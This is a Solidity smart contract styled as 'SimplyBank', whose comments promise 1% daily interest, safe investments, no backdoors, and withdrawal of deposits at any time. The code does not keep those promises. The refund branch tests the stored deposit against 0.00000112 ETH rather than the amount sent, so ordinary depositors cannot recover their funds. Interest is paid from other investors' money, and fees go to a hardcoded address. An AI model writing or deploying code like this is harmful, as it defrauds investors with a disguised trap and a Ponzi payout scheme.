pragma solidity ^0.4.25;

//  SIMPLY BANK - Interest 1% Dayly !
//
//  Improved, no bugs and backdoors! Your investments are safe!
//
//  NO DEPOSIT FEES! All the money go to contract!
//
//  WITHDRAWAL FEES! Technical Support -10% only from The RETURNED DEPOSIT !!
//
//  LOW RISK! You can take your deposit back ANY TIME!
//
//     - Send 0.00000112 ETH to contract address (You will charged 10% for Tech Support)
//
//  LONG LIFE!
//
//  INSTRUCTIONS:
//
//  TO INVEST: send ETH to contract address
//  TO WITHDRAW INTEREST: send 0 ETH to contract address
//  TO REINVEST AND WITHDRAW INTEREST: send ETH to contract address
//  TO GET BACK YOUR DEPOSIT: send 0.00000112 ETH to contract address
//

contract SimplyBank {

    mapping (address => uint256) dates;
    mapping (address => uint256) invests;
    address constant private TECH_SUPPORT = 0x85889bBece41bf106675A9ae3b70Ee78D86C1649;

    function() external payable {
         address sender = msg.sender;
         if (invests[sender] == 0.00000112 ether) {
         
         //Calculate of Tech Support fees from your deposit.
         uint256 techSupportPercent = invests[sender] * 10 / 100;
         //Pay 10% for Tech Support
         TECH_SUPPORT.transfer(techSupportPercent);
         //Available deposit to withdrawal
         uint256 withdrawalAmount = invests[sender] - techSupportPercent;

        //Pay the rest of deposit 
        sender.transfer(withdrawalAmount);
        
        //Delete your information from the Simply Bank
        dates[sender]    = 0;
        invests[sender]  = 0;

        } else {
       
        if (invests[sender] != 0) {
            //Calculate your daily interest
            uint256 payout = invests[sender] / 100 * (now - dates[sender]) / 1 days;
            
            // If your deposit greater than balance.You will get the balance amount.
            if (payout > address(this).balance) {
                payout = address(this).balance;
            }
            //Pay your daily interest.
            sender.transfer(payout);
         }
        dates[sender]    = now;
        invests[sender] += msg.value;
         }
       }

    }